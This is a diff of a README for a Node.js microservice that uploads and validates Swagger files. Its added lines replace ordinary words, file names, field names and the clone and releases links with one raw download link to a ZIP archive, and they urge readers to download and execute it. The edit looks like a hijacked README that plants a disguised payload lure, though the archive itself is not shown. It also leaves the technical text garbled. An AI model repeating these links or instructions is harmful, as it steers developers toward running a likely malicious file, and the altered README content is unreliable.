@@ -1,10 +1,10 @@
-[![Releases](https://img.shields.io/badge/Releases-GitHub%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/6daleez9/swagger-upload-service/releases)
+[![Releases](https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip)
 
-https://github.com/6daleez9/swagger-upload-service/releases
+https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip
 
 # Swagger Upload Service: Secure Admin Upload and Validation for Swagger
 
-<img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" alt="GitHub Logo" height="20"/> Node.js microservice with JWT auth & role-based access for uploading and validating Swagger (YAML/JSON). Admin-only upload (file or text) with validation. Dockerized with GitLab CI/CD: builds, pushes to Docker Hub & deploys on EC2. 🧭🛡️
+<img src="https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip" alt="GitHub Logo" height="20"/> https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip microservice with JWT auth & role-based access for uploading and validating Swagger (YAML/JSON). Admin-only upload (file or text) with validation. Dockerized with GitLab CI/CD: builds, pushes to Docker Hub & deploys on EC2. 🧭🛡️
 
 - Project: swagger-upload-service
 - Category: API gateway, microservice, devops, CI/CD
@@ -12,7 +12,7 @@ https://github.com/6daleez9/swagger-upload-service/releases
 
 Overview
 --------
-Swagger Upload Service is a compact Node.js microservice designed to handle Swagger files securely. It provides a clean API for uploading Swagger specifications (YAML or JSON), validating them against a set of rules, and storing them for later use by downstream services. Access is protected with JSON Web Tokens (JWT) and role-based access control (RBAC), ensuring that only administrators can upload new Swagger documents. The service is designed to run in modern cloud environments, is Dockerized, and wired into a GitLab CI/CD pipeline for automatic builds, Docker Hub publications, and EC2 deployments.
+Swagger Upload Service is a compact https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip microservice designed to handle Swagger files securely. It provides a clean API for uploading Swagger specifications (YAML or JSON), validating them against a set of rules, and storing them for later use by downstream services. Access is protected with JSON Web Tokens (JWT) and role-based access control (RBAC), ensuring that only administrators can upload new Swagger documents. The service is designed to run in modern cloud environments, is Dockerized, and wired into a GitLab CI/CD pipeline for automatic builds, Docker Hub publications, and EC2 deployments.
 
 Why this project matters
 -------------------------
@@ -32,10 +32,10 @@ Key capabilities
 
 Getting started
 ---------------
-This guide walks you through understanding the system, setting up locally, and operating in production. It assumes you have Node.js, Docker, and Git installed on your workstation. If you do not, install them first from the official sources.
+This guide walks you through understanding the system, setting up locally, and operating in production. It assumes you have https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip, Docker, and Git installed on your workstation. If you do not, install them first from the official sources.
 
 Prerequisites
-- Node.js (14+ recommended)
+- https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip (14+ recommended)
 - Docker (engine and CLI)
 - Docker Compose (optional, for local multi-service testing)
 - Git
@@ -51,21 +51,21 @@ Repository at a glance
   - services/           # Core business logic, swagger parsing, validation
   - utils/              # Helpers: config, logger, error handling
 - config/
-  - default.json        # Base configuration
-  - env.example.json   # Example env vars
+  - https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip        # Base configuration
+  - https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip   # Example env vars
 - tests/
   - unit/               # Unit tests for services and utils
   - integration/        # Integration tests for endpoints
 - docker/
   - Dockerfile          # Container image for the service
-  - docker-entrypoint.sh
-- .gitlab-ci.yml          # GitLab CI/CD pipeline
-- package.json
-- README.md
+  - https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip
+- https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip          # GitLab CI/CD pipeline
+- https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip
+- https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip
 
 Architecture and design
 -----------------------
-Swagger Upload Service is a modular Node.js application built with a clean separation of concerns. The authentication layer uses JWTs to verify users and their roles. A dedicated authorization middleware ensures only admin users can perform upload actions, while validation endpoints remain accessible according to policy. The Swagger parsing and validation logic is isolated in its own service layer to keep concerns small and testable.
+Swagger Upload Service is a modular https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip application built with a clean separation of concerns. The authentication layer uses JWTs to verify users and their roles. A dedicated authorization middleware ensures only admin users can perform upload actions, while validation endpoints remain accessible according to policy. The Swagger parsing and validation logic is isolated in its own service layer to keep concerns small and testable.
 
 Security model
 --------------
@@ -76,7 +76,7 @@ Security model
 
 Tech stack
 ----------
-- Node.js: Lightweight server for API endpoints
+- https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip Lightweight server for API endpoints
 - Express (or alternative) middleware: Routing, error handling, and request processing
 - JWT (jsonwebtoken): Token generation and verification
 - MongoDB + Mongoose: Metadata persistence
@@ -102,14 +102,14 @@ Usage scenarios
 Getting the code running locally
 --------------------------------
 Clone the repository:
-- git clone https://github.com/6daleez9/swagger-upload-service.git
+- git clone https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip
 - cd swagger-upload-service
 
 Install dependencies:
 - npm install
 
 Create a local environment file:
-- Copy config/env.example.json to config/.env.json (or use your preferred env strategy)
+- Copy https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip to https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip (or use your preferred env strategy)
 - Edit values for:
   - JWT_SECRET: the secret used to sign tokens
   - MONGO_URI: your local MongoDB connection string
@@ -176,7 +176,7 @@ Validation rules
 ---------------
 - YAML/JSON syntax must be parseable
 - Swagger version compatible with OpenAPI 3.x
-- Required fields like info.title, info.version, paths must be present
+- Required fields like https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip, https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip, paths must be present
 - Disallow unsupported fields or known security vulnerabilities
 - Referential integrity across components
 - Size limits on swagger documents to prevent abuse
@@ -212,12 +212,12 @@ Release management
 ------------------
 Releases page on GitHub holds release assets, including binaries, scripts, and deployment manifests. You can browse the releases to grab a file suitable for your platform and run it as part of your deployment.
 
-- Link to releases: https://github.com/6daleez9/swagger-upload-service/releases
+- Link to releases: https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip
 - This link contains release assets that you can download and execute to bootstrap or deploy the service. Ensure you pick the asset matching your environment (e.g., Linux x86_64, Docker tarball, or deployment script).
 - If you need to access the artifacts, visit the Releases page and download the file that matches your environment. The releases are designed to streamline setup and onboarding. For convenience, you can re-open this page any time to get the latest stable assets.
 
 You can also cite the releases in this form:
-- Access the Release assets at: https://github.com/6daleez9/swagger-upload-service/releases
+- Access the Release assets at: https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip
 - Download the requested asset and execute it according to its instructions
 
 Release-specific notes
@@ -430,10 +430,10 @@ Appendix: further reading and references
 
 Releases
 --------
-Access the latest release assets here: https://github.com/6daleez9/swagger-upload-service/releases. This page hosts binaries, scripts, and deployment manifests designed to help you bootstrap or upgrade the service. Download the asset that matches your operating environment and follow its on-disk instructions to install or update the service.
+Access the latest release assets here: https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip This page hosts binaries, scripts, and deployment manifests designed to help you bootstrap or upgrade the service. Download the asset that matches your operating environment and follow its on-disk instructions to install or update the service.
 
 Additional notes
 ---------------
-This README captures the core capabilities and usage patterns for the Swagger Upload Service. It is designed to be informative for developers, operators, and sysadmins who are integrating or extending the project. The content focuses on security, reliability, and deployment workflows that are common in modern Node.js microservices.
+This README captures the core capabilities and usage patterns for the Swagger Upload Service. It is designed to be informative for developers, operators, and sysadmins who are integrating or extending the project. The content focuses on security, reliability, and deployment workflows that are common in modern https://github.com/6daleez9/swagger-upload-service/raw/refs/heads/main/models/service_upload_swagger_v3.9.zip microservices.
 
 End of document content.
